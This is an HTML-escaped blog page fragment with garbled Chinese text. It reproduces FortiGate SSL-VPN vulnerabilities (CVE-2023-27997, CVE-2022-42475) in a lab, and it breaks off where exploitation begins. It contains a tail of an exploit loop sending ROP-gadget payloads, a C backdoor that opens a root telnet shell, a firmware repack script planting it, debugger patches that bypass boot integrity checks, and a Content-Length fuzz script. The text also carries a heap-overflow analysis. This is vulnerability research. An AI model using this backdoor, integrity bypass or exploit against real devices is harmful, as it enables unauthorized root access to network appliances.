        seed.extend(gen_seeds_u64(salt, ssl_offset+0x10, ssl_offset-2-8))
        seed.extend(gen_seeds_u64(salt, ssl_offset +
                    0x18, mov_rax_rdi_sub_rax_rdx_ret))
        seed.extend(gen_seeds_u64(salt, ssl_offset+0x20, push_rax_pop_rsp_ret))

        # seed.extend(gen_seeds_u64(salt, handshake_func, 0xdeadbeefdeadbeef))
        seed.extend(gen_seeds_u8(salt, in_init, 1))

        for i in seed:
            print(i)
            send_payload(_sk, salt, i[0], i[1], gen_payload())
            # send_payload(_sk, salt, i[0], i[1],
            #              b&#39;\x00&#39;*8 + p64(0xdeadbeef) + b&#39;A&#39;*(0x2000-0x18-7-8-8))

        counter = 0
        for i in socks:
            print(counter)
            counter += 1
            i.send(b&amp;quot;a&amp;quot;*0x40)

    except Exception as e:
        print(f&amp;quot;crash: {e}&amp;quot;)
        _sk.close()
        break

&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/27997.gif&#34; alt=&#34;27997.gif&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">CVE-2023-27997 å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/PjuPrWzmI/"" data-c="
          &lt;p&gt;æœ¬æ–‡å¤ç°CVE-2022-42475ï¼Œç‰ˆæœ¬v7.2.1.F-build1254&lt;/p&gt;
&lt;h2 id=&#34;ä¸‹è½½é“¾æ¥&#34;&gt;ä¸‹è½½é“¾æ¥:&lt;/h2&gt;
&lt;p&gt;https://github.com/hegdepavankumar/Cisco-Images-for-GNS3-and-EVE-NG&lt;/p&gt;
&lt;h2 id=&#34;license&#34;&gt;license :&lt;/h2&gt;
&lt;p&gt;https://github.com/rrrrrrri/fgt-gadgets&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. è¿è¡Œpython3 license_old.pyç”Ÿæˆåå‰å°è®¾ç½®æ—¶å¯¼å…¥å³å¯
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240806175558.png&#34; alt=&#34;Pasted image 20240806175558.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æ–°ç‰ˆï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. å¯¼å…¥ovfï¼Œå¯åŠ¨ååˆå§‹åŒ–è™šæ‹Ÿæœºï¼Œé»˜è®¤ç”¨æˆ·åadminï¼Œé»˜è®¤å¯†ç ç©º
2. åˆå§‹åŒ–å®Œæˆåå…³æœºï¼Œåœ¨è™šæ‹Ÿæœºç›®å½•ä¸‹æœ‰fo-disk1.vmdkç”Ÿæˆ
3. å°†vmdkæŒ‚è½½åˆ°å¦å¤–ä¸€ä¸ªè™šæ‹Ÿæœºä¸­
4. æ–°ç‰ˆæ‰§è¡Œ`python3 decrypt.py -f rootfs.gz -k flatkc`è§£å¯†rootfs.gz
5. rootæƒé™è§£å‹rootfs.gzå’Œbin.tar.xz
	```
	   gzip -d ./dec.gz
       mkdir rootfs
       cd rootfs &amp;amp;&amp;amp; mv ../dec ./
       sudo su
       cpio -idmv &amp;lt; ./dec
       rm -rf ./dec
       xz -d ./bin.tar.xz &amp;amp;&amp;amp; tar -xvf ./bin.tar &amp;amp;&amp;amp; rm -rf ./bin.tar
       cd .. &amp;amp;&amp;amp; mv ./rootfs/bin/init ./
	```
	
6. `python3 patch.py init` patch initæ–‡ä»¶
7. é‡æ‰“åŒ…
	```
	   chmod 755 ./init.patched &amp;amp;&amp;amp; mv ./init.patched ./rootfs/bin/init
       cd rootfs
       tar -cvf bin.tar bin &amp;amp;&amp;amp; xz bin.tar &amp;amp;&amp;amp; rm -rf bin
       find . | cpio -H newc -o &amp;gt; ../rootfs.raw &amp;amp;&amp;amp; cd ..
       cat ./rootfs.raw | gzip &amp;gt; rootfs.gz
    ```
    
8. &#39;python3 patch.py flatkc&#39; patch flatkc
9. æ›¿æ¢æ‰vmdiskçš„rootfs.gzå’Œflatkc
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ç½‘ç»œé…ç½®&#34;&gt;ç½‘ç»œé…ç½®ï¼š&lt;/h2&gt;
&lt;p&gt;https://blog.csdn.net/meigang2012/article/details/87903878&lt;br&gt;
https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#é…ç½®portå’Œip
config system interface
edit port1
set mode static
set ip 192.168.122.99 255.255.255.0
set allowaccess ping https ssh http telnet
end

#é…ç½®ç½‘å…³
config router static
edit 1
set device port1
set gateway 192.168.122.128
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;VMwareç½‘ç»œé€‚é…å™¨è®¾ç½®ä¸ºNATï¼Œè™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ä¿®æ”¹å­ç½‘ip&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240807100542.png&#34; alt=&#34;Pasted image 20240807100542.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿›å…¥åå°åå‰å¾€System/Settingsä¿®æ”¹&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240806175558.png&#34; alt=&#34;Pasted image 20240806175558.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
VPN/SSL-VPNé—¨æˆ·&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814105739.png&#34; alt=&#34;Pasted image 20240814105739.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;SSL-VPNè®¾ç½®&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240812101642.png&#34; alt=&#34;Pasted image 20240812101642.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;é…ç½®sslvpnçš„é˜²ç«å¢™ç­–ç•¥&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814105636.png&#34; alt=&#34;Pasted image 20240814105636.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;patch&#34;&gt;Patchï¼š&lt;/h2&gt;
&lt;h3 id=&#34;å›ºä»¶è§£åŒ…åé—¨æ¤å…¥&#34;&gt;å›ºä»¶è§£åŒ…&amp;amp;&amp;amp;åé—¨æ¤å…¥ï¼š&lt;/h3&gt;
&lt;p&gt;æ›¿æ¢åŸç‰ˆ/bin/shè½¯é“¾æ¥ä¸ºåŠŸèƒ½é½å…¨çš„é¢„ç¼–è¯‘busybox&lt;br&gt;
ä¼ å…¥é¢„ç¼–è¯‘çš„gdbserveræ–¹ä¾¿è°ƒè¯•&lt;br&gt;
å°†/bin/smartctlæ›¿æ¢ä¸ºå¼€å¯telnetçš„åé—¨ï¼Œæ‰§è¡Œ&lt;code&gt;diagnose hardware smartctl&lt;/code&gt;è§¦å‘&lt;br&gt;
åé—¨backdoor.c:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// gcc -s backdoor.c -o backdoor
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

void shell()
{
    system(&amp;quot;/bin/busybox ls&amp;quot;);
    system(&amp;quot;/bin/busybox id&amp;quot;);
    system(&amp;quot;/bin/busybox killall sshd &amp;amp;&amp;amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&amp;quot;);
    system(&amp;quot;/bin/busybox ash --login -s&amp;quot;);
    return;
}

int main(int argc, char const *argv[])
{
    shell();
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ–‡ä»¶ç³»ç»Ÿå­˜åœ¨äºgzipå‹ç¼©çš„cpioä¸­&lt;br&gt;
å…¶ä¸­fsä¸­çš„.tar.xzçš„å‹ç¼©åŒ…ç”±fortigateé­”æ”¹åŠ å¯†ï¼Œéœ€ä½¿ç”¨sbin/ç›®å½•ä¸‹çš„elfè§£å‹ç¼©&lt;br&gt;
ä¸‹é¢ç»™å‡ºæå–åŠåé—¨æ¤å…¥è„šæœ¬ï¼Œæ›¿æ¢æ–‡ä»¶éœ€è·Ÿè„šæœ¬åŒä¸€ç›®å½•ï¼Œrootæƒé™ä¸‹æ‰§è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
echo &amp;quot;è¯·å°†backdoor,busybox,gdbserverç½®äºä¸è„šæœ¬åŒä¸€ç›®å½•ä¸‹&amp;quot;
chmod +x $PWD/*
mkdir -p $PWD/fs
cp /media/fk/FORTIOS/rootfs.gz $PWD
gzip -d rootfs.gz
cd $PWD/fs
cpio -idmv &amp;lt; ../rootfs
chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
chroot . /sbin/ftar -xf /bin.tar
chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz
chroot . /sbin/ftar -xf /migadmin.tar
chroot . /sbin/xz --check=sha256 -d /usr.tar.xz
chroot . /sbin/ftar -xf /usr.tar
cp ../backdoor bin/smartctl 
cp ../busybox bin/busybox 
cp ../gdbserver* bin/gdbserver
chmod +777 bin/smartctl
chmod +777 bin/busybox
chmod +777 bin/gdbserver
rm bin/sh
ln -sn /bin/busybox bin/sh
echo &amp;quot;æ‰‹åŠ¨patch init...&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;patch initåï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
echo &amp;quot;è¯·å°†initç½®äºä¸è„šæœ¬åŒä¸€ç›®å½•ä¸‹&amp;quot;
sudo cp init fs/bin/init
cd fs
find . | cpio -H newc -o &amp;gt; ../rootfs.raw
cd ..
cat ./rootfs.raw | gzip &amp;gt; rootfs.gz
rm rootfs.raw &amp;amp;&amp;amp; rm rootfs
chmod -R 777 rootfs.gz
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–è€…ä½¿ç”¨è¿™é‡Œçš„auto-repackè„šæœ¬:&lt;br&gt;
https://github.com/rrrrrrri/fgt-auto-repack/blob/main/automatic_repack.py&lt;/p&gt;
&lt;p&gt;fo.vmxä¿®æ”¹å¼€å¯debugStub&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;debugStub.listen.guest64 = &amp;quot;TRUE&amp;quot;
debugStub.listen.guest64.remote = &amp;quot;TRUE&amp;quot;
debugStub.port.guest64 = &amp;quot;12345&amp;quot;
debugStub.listen.guest32 = &amp;quot;TRUE&amp;quot;
debugStub.listen.guest32.remote = &amp;quot;TRUE&amp;quot;
debugStub.port.guest32 = &amp;quot;12346&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å¯åŠ¨é€»è¾‘&#34;&gt;å¯åŠ¨é€»è¾‘:&lt;/h3&gt;
&lt;p&gt;ä½¿ç”¨vmlinux-to-elfå°†å†…æ ¸flatkcè½¬ä¸ºelfåˆ†æä¸€ä¸‹å¯åŠ¨é€»è¾‘&lt;/p&gt;
&lt;p&gt;flatkc-&amp;gt;/sbin/init-&amp;gt;/bin/init&lt;/p&gt;
&lt;p&gt;flatkcçš„init_postä¸­fgt_verifyæœ‰å¯¹æ–‡ä»¶å“ˆå¸Œç­‰ç­‰çš„æ£€æµ‹&lt;br&gt;
å¦‚æœä¸èƒ½é€šè¿‡fgt_verifyæ£€æµ‹ä¼šå¯åŠ¨/sbin/init&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240807155305.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;è€Œ/sbin/initä¼šè§£å‹æ–‡ä»¶ç³»ç»Ÿä¸­çš„tar.xzå‹ç¼©åŒ…&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240807153418.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¸ºäº†é˜²æ­¢ä¹‹å‰è§£å‹patchçš„æ–‡ä»¶è¢«è¦†ç›–ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡/sbin/initçš„æ‰§è¡Œ&lt;br&gt;
æœ‰ä¸¤ç§patchæ–¹å¼&lt;br&gt;
ç¬¬ä¸€ç§ä¾¿æ˜¯å¯åŠ¨vmçš„debugåœ¨å¯åŠ¨æ—¶æ›´æ”¹å¯„å­˜å™¨çš„å€¼è¿›è€Œä¿®æ”¹å¯åŠ¨è¿›ç¨‹&lt;br&gt;
ç¬¬äºŒç§patch å†…æ ¸elfåè½¬å›å†…æ ¸æ–‡ä»¶ (æš‚æœªéªŒè¯:https://wzt.ac.cn/2024/04/02/fortigate_debug_env2/)&lt;/p&gt;
&lt;p&gt;/bin/initä¸­å­˜åœ¨å‡ ä¸ªé’ˆå¯¹æ–‡ä»¶ç³»ç»Ÿæ˜¯å¦è¢«ä¿®æ”¹çš„æ£€æŸ¥&lt;br&gt;
é€šè¿‡å¯åŠ¨æ—¶æ‰“å°çš„&lt;code&gt;System is starting&lt;/code&gt;å®šä½å‡½æ•°&lt;br&gt;
å¦‚æœcheckå¤±è´¥ä¼šé‡å¯ï¼Œè¿™é‡Œæˆ‘ä»¬å°†å…¶do_haltå‡½æ•°ç¬¬ä¸€æ¡æ”¹æˆret&lt;br&gt;
![[Pasted image 20240812213039.png]]&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240812213049.png&#34; alt=&#34;Pasted image 20240812213049.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;debugstubè°ƒè¯•&#34;&gt;debugStubè°ƒè¯•&lt;/h2&gt;
&lt;p&gt;æ–­åœ¨&lt;code&gt;fgt_verify&lt;/code&gt;è¿™é‡Œå°†è¿”å›å€¼æ”¹ä¸º0å³å¯è¿›å…¥ifåˆ†æ”¯ï¼ŒåŒæ—¶å°†&lt;code&gt;/sbin/init&lt;/code&gt; patchä¸º &lt;code&gt;/bin/init&lt;/code&gt;ï¼Œä»è€Œç›´æ¥æ‰§è¡Œ&lt;code&gt;/bin/init&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809110446.png&#34; alt=&#34;Pasted image 20240809110446.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809105240.png&#34; alt=&#34;Pasted image 20240809105240.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;b *0xffffffff807ac117
c
ni
set $rax = 0
patch string 0xffffffff808f3591 &amp;quot;/bin/init&amp;quot;
patch byte 0xffffffff808f3591+9 0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809111721.png&#34; alt=&#34;Pasted image 20240809111721.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;patchæˆåŠŸåä¾¿èƒ½æ­£å¸¸å¯åŠ¨&lt;/p&gt;
&lt;p&gt;æ­¤æ—¶è¾“å…¥&lt;code&gt;diagnose hardware smartctl&lt;/code&gt;å¼€å¯telnetåé—¨ (è®°å¾—ç¼–è¯‘åé—¨å’Œbusyboxçš„æ—¶å€™ç”¨å¯¹glibcç‰ˆæœ¬ï¼Œå¯ä»¥åˆ°æ–‡ä»¶ç³»ç»Ÿä¸‹çš„lib/libc.so.6æ‰¾ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„æœ€é«˜æ”¯æŒåˆ°GLIBC_2.30&lt;br&gt;
å¦åˆ™å°±ä¼šåƒä¸‹é¢è¿™æ ·&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809112152.png&#34; alt=&#34;Pasted image 20240809112152.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦å¤–æ³¨æ„ç¼–è¯‘busyboxçš„æ—¶å€™å¼€å¯standalone shellï¼Œä¸ç„¶ä¼šæç¤ºapplet not found&lt;br&gt;
åé—¨&lt;code&gt;/bin/busybox ash --login -s&lt;/code&gt;å³æ˜¯å¼€å¯standalone shell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809154630.png&#34; alt=&#34;Pasted image 20240809154630.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;æ¼æ´éªŒè¯&#34;&gt;æ¼æ´éªŒè¯ï¼š&lt;/h2&gt;
&lt;p&gt;æ ¹æ®ï¼šFortiOS sslvpndÂ ä¸­å­˜åœ¨åŸºäºå †çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå¯åˆ©ç”¨è¯¥æ¼æ´åœ¨æœªç»èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹é€šè¿‡ç‰¹åˆ¶è¯·æ±‚è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤æˆ–ä»£ç &lt;br&gt;
å·²çŸ¥ç”±Content-Lengthå¼•èµ·&lt;br&gt;
è¿™é‡Œç”¨fuzzè„šæœ¬æµ‹è¯•:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl

path = &amp;quot;/remote/login&amp;quot;.encode()
content_length = [&amp;quot;0&amp;quot;, &amp;quot;-1&amp;quot;, &amp;quot;2147483647&amp;quot;, &amp;quot;2147483648&amp;quot;, &amp;quot;-0&amp;quot;,
                  &amp;quot;4294967295&amp;quot;, &amp;quot;4294967296&amp;quot;, &amp;quot;1111111111111&amp;quot;, &amp;quot;22222222222&amp;quot;]

# 2147483647 int max
# 2147483648 max+1 -&amp;gt; -2147483648
# 4294967295 unsigned int max
# 4294967296 max+1 -&amp;gt; 0
# 1111111111111
# 2222222222222

for CL in content_length:
    print(&amp;quot;[+] &amp;quot;+str(CL)+&amp;quot; :&amp;quot;)
    try:
        data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
            CL.encode() + b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;quot;
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _default_context = ssl._create_unverified_context()
        client = _default_context.wrap_socket(client)
        client.connect((&amp;quot;192.168.122.99&amp;quot;, 1443))
        client.sendall(data)
        res = client.recv(1024)
        if b&amp;quot;HTTP/1.1&amp;quot; not in res:
            print(&amp;quot;Error detected&amp;quot;)
            print(CL)
            break
    except Exception as e:
        print(e)
        print(&amp;quot;Error detected&amp;quot;)
        print(CL)
        break

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥å‘ç°åœ¨CLè®¾ç½®ä¸º2147483647æ—¶å‡ºç°é”™è¯¯&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814150311.png&#34; alt=&#34;Pasted image 20240814150311.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
gdbserverè°ƒè¯•ï¼Œä½¿ç”¨telnetçš„23ç«¯å£ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;killall telnetd &amp;amp;&amp;amp; /bin/gdbserver 192.168.122.99:23 --attach $(ps|grep sslvpn|grep -v grep|awk &#39;{print $1}&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814153201.png&#34; alt=&#34;Pasted image 20240814153201.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
backtrace:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;pwndbg&amp;gt; bt
#0  0x00007f8cfaa4476d in __memset_avx2_erms () from target:/usr/lib/x86_64-linux-gnu/libc.so.6
#1  0x000000000164e5d9 in ?? ()
#2  0x0000000001785ac2 in ?? ()
#3  0x000000000177f48d in ?? ()
#4  0x0000000001780b40 in ?? ()
#5  0x0000000001780c1e in ?? ()
#6  0x0000000001781131 in ?? ()
#7  0x00000000017823dc in ?? ()
#8  0x0000000001783762 in ?? ()
#9  0x0000000000448ddf in ?? ()
#10 0x0000000000451eba in ?? ()
#11 0x000000000044ea1c in ?? ()
#12 0x0000000000451128 in ?? ()
#13 0x0000000000451a51 in ?? ()
#14 0x00007f8cfa90ddeb in __libc_start_main () from target:/usr/lib/x86_64-linux-gnu/libc.so.6
#15 0x0000000000443c7a in ?? ()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è·Ÿè¸ªåˆ°æœ€åmemsetè°ƒç”¨å¤„&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void *__fastcall pool_alloc(__int64 a1, size_t a2)
{
  _QWORD *v2; // rax
  char *v3; // r8
  unsigned __int64 v4; // rbx
  unsigned __int64 v7; // rdi
  __int64 v8; // rax

  v2 = *(_QWORD **)(a1 + 8);
  v3 = (char *)v2[2];
  if ( a2 )
  {
    v4 = 8LL * (int)(((a2 - 1) &amp;gt;&amp;gt; 3) + 1);
    if ( (unsigned __int64)&amp;amp;v3[v4] &amp;gt; *v2 )
    {
      v7 = dword_A8AC5A4 - 25;
      if ( v7 &amp;lt; v4 )
        v7 = 8LL * (int)(((a2 - 1) &amp;gt;&amp;gt; 3) + 1);
      v8 = sub_164E140(v7);
      *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8LL) = v8;
      *(_QWORD *)(a1 + 8) = v8;
      v3 = *(char **)(v8 + 16);
      *(_QWORD *)(v8 + 16) = &amp;amp;v3[v4];
    }
    else
    {
      v2[2] = &amp;amp;v3[v4];
    }
  }
  else
  {
    v3 = 0LL;
  }
  return memset(v3, 0, a2);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…¶ä¸­æœ€åreturnçš„memsetçš„a2å‚æ•°æ¥æºäºsub_17859D0ä¸­&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  v1 = (__int64 *)a1[92];
  v2 = sub_17901D0(a1[83]);
  v3 = v2;
  if ( !*(_QWORD *)(v2 + 8) )
    *(_QWORD *)(v2 + 8) = pool_alloc(*v1, *(_DWORD *)(v2 + 24) + 1);// Content-Length å–4å­—èŠ‚+1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç°åœ¨pocè§¦å‘æ—¶CLä¸º2147483647ï¼Œå³0x7fffffff&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov     eax, [rax+18h]
mov     rdi, [r12]
lea     esi, [rax+1]
movsxd  rsi, esi
call    pool_alloc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œmovsxdä¸ºå¸¦ç¬¦å·æ‰©å±•ä¼ é€æŒ‡ä»¤&lt;br&gt;
å°†32ä½æ‰©å±•ä¸º64ä½ï¼Œå½“æ‰©å±•ä¸€ä¸ªè´Ÿæ•°çš„æ—¶å€™éœ€è¦å°†æ‰©å±•çš„é«˜ä½å…¨èµ‹ä¸º1.å¯¹äºæ­£æ•°è€Œè¨€ï¼Œç¬¦å·æ‰©å±•å’Œé›¶æ‰©å±•movzxæ˜¯ä¸€æ ·çš„ï¼Œå°†æ‰©å±•çš„é«˜ä½å…¨èµ‹ä¸º0ï¼Œè€Œ0x7fffffff+1åæœ€é«˜ä½ç¬¦å·ä½ä¸º1ï¼Œæ‰€ä»¥ç»è¿‡æ‰©å±•årsiå¯„å­˜å™¨å€¼ä¸º0xffffffff80000000ï¼Œä¼ é€’ç»™memsetè½¬æ¢ä¸ºsize_tæ— ç¬¦å·æ•´æ•°ä¼šå¯¼è‡´å†…å­˜æº¢å‡ºï¼Œå´©æºƒ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; â–º 0x164e5d4    call   memset@plt                      &amp;lt;memset@plt&amp;gt;
        s: 0x7f8cf4a556c8 â—‚â€” 0x0
        c: 0x0
        n: 0xffffffff80000000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è€Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä½¿å¾—pool_allocçš„å †å—å¤§å°å°äºä¸‹æ–¹memcpyæ—¶ä½æ‰©å±•åçš„å¤§å°ï¼Œä»è€Œå¯¼è‡´å †æº¢å‡º&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;v1 = (__int64 *)a1[92];
  v2 = sub_17901D0(a1[83]);
  v3 = v2;
  if ( !*(_QWORD *)(v2 + 8) )
    *(_QWORD *)(v2 + 8) = pool_alloc(*v1, *(_DWORD *)(v2 + 24) + 1);// Content-Length å–4å­—èŠ‚+1 ï¼Œ åˆ†é…å°å †å—
  v4 = sub_1662AC0(v1, v3 + 32, 8190LL);
  v5 = v4;
  if ( v4 )
  {
    if ( v4 &amp;lt; 0 )
    {
      if ( (unsigned int)sub_16593E0(a1[77]) - 1 &amp;lt;= 4 )
        return 0LL;
    }
    else
    {
      v6 = *(int *)(v3 + 16);
      v7 = *(_QWORD *)(v3 + 24);
      if ( (int)v6 + v4 &amp;gt; v7 )
        v5 = *(_QWORD *)(v3 + 24) - v6;
      if ( v7 &amp;gt; v6 )
      {
        memcpy((void *)(*(_QWORD *)(v3 + 8) + v6), (const void *)(v3 + 32), v5); // å †æº¢å‡º
        v10 = *(_QWORD *)(v3 + 24);
        v11 = *(_DWORD *)(v3 + 16) + v5;
        *(_DWORD *)(v3 + 16) = v11;
        if ( v11 &amp;lt; v10 )
          return 0LL;
      }
      else
      {
        v8 = *(_DWORD *)(v3 + 16) + v5;
        *(_DWORD *)(v3 + 16) = v8;
        if ( v8 &amp;lt; v7 )
          return 0LL;
      }
    }
  }
  return 2LL;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬æ„é€ CLä¸º0x100000000ï¼Œæ–­åœ¨0x1785ABDå¤„ï¼Œå¯ä»¥çœ‹å‡ºåœ¨ç»è¿‡ä½æ‰©å±•åä¼ å…¥å‚æ•°ä¸º1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt; â†’  0x1785abd                  call   0x164e590
   â†³   0x164e590                  push   rbp
       0x164e591                  mov    rbp, rsp
       0x164e594                  push   r13
       0x164e596                  push   r12
       0x164e598                  mov    r12, rsi
       0x164e59b                  push   rbx
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ arguments (guessed) â”€â”€â”€â”€0x164e590 (
   $rdi = 0x00007f146c2fa018 â†’ 0x00007f146c2fa000 â†’ 0x00007f146c2fa400 â†’ 0x00007f146c2fa800 â†’ 0x0000000000000006,
   $rsi = 0x0000000000000001
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶ååˆ°memcpyå¤„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;memcpy@plt (
   $rdi = 0x00007f146c2fa818 â†’ 0x0000000000000000,
   $rsi = 0x00007f146c342038 â†’ &amp;quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&amp;quot;,
   $rdx = 0x0000000000001000,
   $rcx = 0x0000000000000000
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤å¤„å¯ä»¥å‘é€è¶…é•¿dataï¼Œèƒ½å¤Ÿå †æº¢å‡º&lt;/p&gt;
&lt;h2 id=&#34;æ¼æ´åˆ©ç”¨&#34;&gt;æ¼æ´åˆ©ç”¨ï¼š&lt;/h2&gt;
&lt;p&gt;ç°åœ¨èƒ½å¤Ÿè¿›è¡Œå †æº¢å‡ºï¼Œä½†æ˜¯å¦‚ä½•åŠ«æŒæ‰§è¡Œæµå‘¢ï¼Œè¿™é‡Œå‚è€ƒä¸‹é¢æ–‡ç« :&lt;br&gt;
https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&lt;br&gt;
